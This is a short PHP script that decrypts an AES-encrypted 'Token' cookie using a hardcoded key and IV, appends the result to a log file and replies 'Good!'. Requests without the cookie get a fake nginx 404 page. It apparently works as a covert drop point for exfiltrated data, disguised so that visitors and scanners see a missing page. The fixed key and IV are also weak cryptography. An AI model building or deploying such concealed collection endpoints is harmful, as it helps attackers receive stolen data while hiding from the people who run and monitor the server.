<?php
class AesWithOpenssl
{
    public static $key; // 秘钥
    public static $iv; // 偏移量

    public function __construct()
    {
        self::$key = 'ooo00iiiIIIlllii';
        self::$iv  = 'zzzzZZZZTTTTLLLL';
    }

    public function encryptWithOpenssl($data = '')
    {
        return base64_encode(openssl_encrypt($data, "AES-128-CBC", self::$key, OPENSSL_RAW_DATA, self::$iv));
    }

    public function decryptWithOpenssl($data = '')
    {

        return openssl_decrypt(base64_decode($data), "AES-128-CBC", self::$key, OPENSSL_RAW_DATA, self::$iv);
    }
}


//$str="admin888";
$obj = new AesWithOpenssl();
$token=$_COOKIE['Token'];
if(isset($token))
{
   // echo $token;
$decrypt_token=$obj->decryptWithOpenssl($token);
//echo $decrypt_token.PHP_EOL;
file_put_contents('./loger/webinfo.log',$decrypt_token,FILE_APPEND); 
echo "Good!";
}else{
header("HTTP/1.0 404 Not Found");
echo
'<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx</center>
</body>
</html>';

}

?>
